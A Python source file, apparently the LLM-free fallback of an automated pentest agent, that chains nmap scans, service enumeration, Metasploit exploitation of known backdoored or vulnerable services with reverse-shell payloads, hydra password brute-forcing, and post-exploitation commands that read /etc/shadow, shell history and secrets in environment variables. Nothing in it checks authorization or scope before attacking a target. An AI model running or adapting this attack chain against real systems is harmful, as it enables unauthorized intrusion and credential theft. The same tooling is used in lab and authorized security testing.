"""
DeterministicPentest — Full pentest without any LLM calls.

Uses only:
- RAG queries (ChromaDB) for known exploit commands
- Predefined tool chains (nmap → enum4linux → searchsploit → msfconsole)
- Version-to-CVE mapping
- Credential brute-forcing with hydra
- Post-exploit commands

This is the fallback when LLM fails 3+ times in a row.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
from pathlib import Path
from typing import Any


class DeterministicPentest:
    """
    Deterministic pentest execution without LLM.
    
    Executes a predefined attack chain based on service fingerprinting
    and RAG-retrieved exploit commands. No reasoning, just execution.
    """
    
    # Predefined tool chains per service
    TOOL_CHAINS = {
        "ftp": ["nmap -sV -sC -p21", "hydra -l anonymous -p anonymous -s 21 ftp"],
        "ssh": ["nmap -sV -sC -p22", "hydra -L users.txt -P passwords.txt -s 22 ssh"],
        "telnet": ["nmap -sV -sC -p23", "hydra -l root -P passwords.txt -s 23 telnet"],
        "smtp": ["nmap -sV -sC -p25", "smtp-user-enum -M VRFY -u root"],
        "http": ["nmap -sV -sC -p80,443,8080", "nikto -h", "gobuster dir -w common.txt -u"],
        "smb": ["nmap -sV -sC -p445", "enum4linux -a", "smbclient -L -N"],
        "mysql": ["nmap -sV -sC -p3306", "hydra -l root -P passwords.txt mysql"],
        "postgresql": ["nmap -sV -sC -p5432", "hydra -l postgres -P passwords.txt postgres"],
        "irc": ["nmap -sV -sC -p6667,6697"],
        "rpc": ["nmap -sV -sC -p111", "rpcinfo -p"],
    }
    
    # Version-to-CVE mapping (common exploitable versions)
    VERSION_CVE_MAP = {
        "vsftpd 2.3.4": {
            "cve": "CVE-2011-2523",
            "msf_module": "exploit/unix/ftp/vsftpd_234_backdoor",
            "payload": "cmd/unix/interact",
        },
        "Samba 3.0.20": {
            "cve": "CVE-2007-2447",
            "msf_module": "exploit/multi/samba/usermap_script",
            "payload": "cmd/unix/reverse",
        },
        "ProFTPD 1.3.3c": {
            "cve": "CVE-2010-4221",
            "msf_module": "exploit/unix/ftp/proftpd_133c_backdoor",
            "payload": "cmd/unix/reverse",
        },
        "UnrealIRCd 3.2.8.1": {
            "cve": "CVE-2010-2075",
            "msf_module": "exploit/unix/irc/unreal_ircd_3281_backdoor",
            "payload": "cmd/unix/reverse",
        },
        "distccd": {
            "cve": "CVE-2004-2687",
            "msf_module": "exploit/unix/misc/distcc_exec",
            "payload": "cmd/unix/reverse",
        },
        "Apache 2.4.49": {
            "cve": "CVE-2021-41773",
            "msf_module": "exploit/multi/http/apache_normalize_path_rce",
            "payload": "linux/x64/meterpreter/reverse_tcp",
        },
        "Apache 2.4.50": {
            "cve": "CVE-2021-42013",
            "msf_module": "exploit/multi/http/apache_normalize_path_rce",
            "payload": "linux/x64/meterpreter/reverse_tcp",
        },
    }
    
    # Post-exploit commands for loot gathering
    POST_EXPLOIT_COMMANDS = [
        "id",
        "whoami",
        "uname -a",
        "cat /etc/passwd",
        "cat /etc/shadow 2>/dev/null",
        "cat /etc/hosts",
        "ifconfig 2>/dev/null || ip addr",
        "netstat -tlnp 2>/dev/null || ss -tlnp",
        "ps aux | head -30",
        "find / -perm -4000 -type f 2>/dev/null | head -10",
        "cat ~/.bash_history 2>/dev/null | tail -20",
        "env | grep -i 'pass\\|key\\|secret\\|token'",
        "ls -la /home/",
        "cat /etc/crontab 2>/dev/null",
    ]
    
    def __init__(self, mission_memory=None, chroma_manager=None):
        self.memory = mission_memory
        self.chroma = chroma_manager
        self.target = ""
        self.results: dict[str, Any] = {
            "ports": [],
            "services": [],
            "vulnerabilities": [],
            "credentials": [],
            "shells": [],
            "loot": [],
        }
    
    def run(self, target: str) -> dict:
        """
        Execute full deterministic pentest chain.
        
        Returns:
            Dict with all findings (ports, vulns, shells, loot)
        """
        self.target = target
        self.results = {
            "ports": [],
            "services": [],
            "vulnerabilities": [],
            "credentials": [],
            "shells": [],
            "loot": [],
        }
        
        print(f"[DeterministicPentest] Starting on {target}")
        
        # Phase 1: Port scan
        print("[Phase 1] Port scanning...")
        self._phase_port_scan()
        
        # Phase 2: Service enumeration
        print("[Phase 2] Service enumeration...")
        self._phase_service_enum()
        
        # Phase 3: Vulnerability exploitation
        print("[Phase 3] Exploitation...")
        self._phase_exploitation()
        
        # Phase 4: Credential attacks
        print("[Phase 4] Credential attacks...")
        self._phase_credentials()
        
        # Phase 5: Post-exploitation
        if self.results["shells"]:
            print("[Phase 5] Post-exploitation...")
            self._phase_post_exploit()
        
        return {
            "agent": "DeterministicPentest",
            "success": len(self.results["shells"]) > 0,
            "target": target,
            "result": self.results,
        }
    
    def _run_command(self, cmd: list | str, timeout: int = 120) -> str:
        """Run shell command and return output."""
        try:
            if isinstance(cmd, str):
                cmd = cmd.split()
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return f"[TIMEOUT after {timeout}s]"
        except Exception as e:
            return f"[ERROR: {e}]"
    
    def _phase_port_scan(self) -> None:
        """Phase 1: Fast port scan."""
        # Quick SYN scan
        output = self._run_command(
            ["nmap", "-sS", "-sV", "-sC", "-T4", "-p-", "--min-rate=1000", self.target],
            timeout=300
        )
        
        # Parse ports
        for match in re.finditer(r"(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)", output):
            port, proto, service, version = match.groups()
            self.results["ports"].append({
                "port": int(port),
                "protocol": proto,
                "service": service,
                "version": version.strip(),
            })
            self.results["services"].append({
                "port": int(port),
                "service": service,
                "version": version.strip(),
            })
    
    def _phase_service_enum(self) -> None:
        """Phase 2: Service-specific enumeration."""
        for svc in self.results["services"]:
            service = svc["service"].lower()
            port = svc["port"]
            
            # Find matching tool chain
            for svc_key, tools in self.TOOL_CHAINS.items():
                if svc_key in service:
                    for tool_template in tools:
                        # Replace placeholders
                        cmd = tool_template.replace("{target}", self.target)
                        if "-p" not in cmd:
                            cmd = f"{cmd} {self.target}"
                        
                        print(f"  → Running: {cmd[:60]}...")
                        output = self._run_command(cmd, timeout=60)
                        
                        # Check for vulnerabilities in output
                        self._check_vuln_indicators(output, svc)
                    break
    
    def _check_vuln_indicators(self, output: str, service: dict) -> None:
        """Check output for vulnerability indicators."""
        version = service.get("version", "")
        
        # Check against VERSION_CVE_MAP
        for ver_pattern, vuln_info in self.VERSION_CVE_MAP.items():
            if ver_pattern.lower() in version.lower():
                self.results["vulnerabilities"].append({
                    "cve": vuln_info["cve"],
                    "service": service["service"],
                    "port": service["port"],
                    "version": version,
                    "msf_module": vuln_info["msf_module"],
                    "payload": vuln_info["payload"],
                    "exploitable": True,
                })
        
        # Check for common vuln patterns in output
        vuln_patterns = [
            (r"VULNERABLE", "high"),
            (r"CVE-\d{4}-\d+", "high"),
            (r"backdoor", "critical"),
            (r"anonymous.*allowed", "medium"),
            (r"default.*password", "high"),
        ]
        
        for pattern, severity in vuln_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                cve_match = re.search(r"CVE-\d{4}-\d+", output)
                self.results["vulnerabilities"].append({
                    "cve": cve_match.group(0) if cve_match else "CVE-UNKNOWN",
                    "service": service["service"],
                    "port": service["port"],
                    "severity": severity,
                    "evidence": output[:200],
                })
    
    def _phase_exploitation(self) -> None:
        """Phase 3: Exploit vulnerabilities."""
        for vuln in self.results["vulnerabilities"]:
            if not vuln.get("msf_module"):
                continue
            
            msf_module = vuln["msf_module"]
            payload = vuln.get("payload", "cmd/unix/reverse")
            port = vuln["port"]
            
            # Get LHOST dynamically
            lhost = self._get_lhost()
            lport = 4444 + len(self.results["shells"])
            
            # Build MSF command
            msf_cmd = (
                f"use {msf_module}; "
                f"set RHOSTS {self.target}; "
                f"set RPORT {port}; "
                f"set PAYLOAD {payload}; "
                f"set LHOST {lhost}; "
                f"set LPORT {lport}; "
                f"run; exit -y"
            )
            
            print(f"  → Exploiting {vuln['cve']} via {msf_module}...")
            output = self._run_command(
                ["msfconsole", "-q", "-x", msf_cmd],
                timeout=180
            )
            
            # Check for shell
            if self._check_shell_success(output):
                self.results["shells"].append({
                    "type": "metasploit",
                    "cve": vuln["cve"],
                    "module": msf_module,
                    "evidence": output[:300],
                })
                print(f"  ✓ Shell obtained via {vuln['cve']}!")
                return  # Stop on first shell
    
    def _check_shell_success(self, output: str) -> bool:
        """Check if shell was obtained."""
        success_patterns = [
            r"session \d+ opened",
            r"meterpreter\s*>",
            r"Command shell session",
            r"uid=\d+",
        ]
        return any(re.search(p, output) for p in success_patterns)
    
    def _phase_credentials(self) -> None:
        """Phase 4: Credential brute-forcing."""
        if self.results["shells"]:
            return  # Already have shell
        
        # Common wordlists
        users = ["root", "admin", "user", "postgres", "mysql", "ftp", "www-data"]
        passwords_file = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(passwords_file):
            passwords_file = "/usr/share/wordlists/metasploit/unix_passwords.txt"
        
        for svc in self.results["services"]:
            service = svc["service"].lower()
            port = svc["port"]
            
            # Only brute-force auth services
            if service not in ["ssh", "ftp", "mysql", "postgresql", "telnet"]:
                continue
            
            for user in users[:3]:  # Limit users
                print(f"  → Hydra {service}://{user}@{self.target}:{port}...")
                
                output = self._run_command([
                    "hydra", "-l", user, "-P", passwords_file,
                    "-s", str(port), "-t", "4", "-f",
                    self.target, service
                ], timeout=120)
                
                # Check for success
                if "login:" in output and "password:" in output:
                    match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", output)
                    if match:
                        self.results["credentials"].append({
                            "service": service,
                            "port": port,
                            "username": match.group(1),
                            "password": match.group(2),
                        })
                        print(f"  ✓ Found: {match.group(1)}:{match.group(2)}")
    
    def _phase_post_exploit(self) -> None:
        """Phase 5: Post-exploitation loot gathering."""
        if not self.results["shells"]:
            return
        
        # Determine shell connection method
        shell = self.results["shells"][0]
        
        for cmd in self.POST_EXPLOIT_COMMANDS:
            print(f"  → {cmd}")
            # Would need active shell here - simplified for now
            self.results["loot"].append({
                "command": cmd,
                "status": "pending",
            })
    
    def _get_lhost(self) -> str:
        """Get local IP for reverse connections."""
        try:
            output = self._run_command(
                f"ip route get {self.target}".split(),
                timeout=5
            )
            match = re.search(r"src\s+(\d+\.\d+\.\d+\.\d+)", output)
            if match:
                return match.group(1)
        except Exception:
            pass
        return "0.0.0.0"
    
    def query_rag_for_exploit(self, service: str, version: str) -> dict | None:
        """Query RAG for exploit commands (if chroma available)."""
        if not self.chroma:
            return None
        
        try:
            results = self.chroma.get_rag_context(
                f"{service} {version} exploit metasploit",
                collections=["exploitdb", "hacktricks"],
                n=3,
            )
            
            for hit in results:
                text = hit.get("text", "")
                # Try to extract MSF module
                msf_match = re.search(r"exploit/[a-z_/]+", text)
                if msf_match:
                    return {
                        "msf_module": msf_match.group(0),
                        "source": "rag",
                        "text": text[:200],
                    }
        except Exception:
            pass
        
        return None
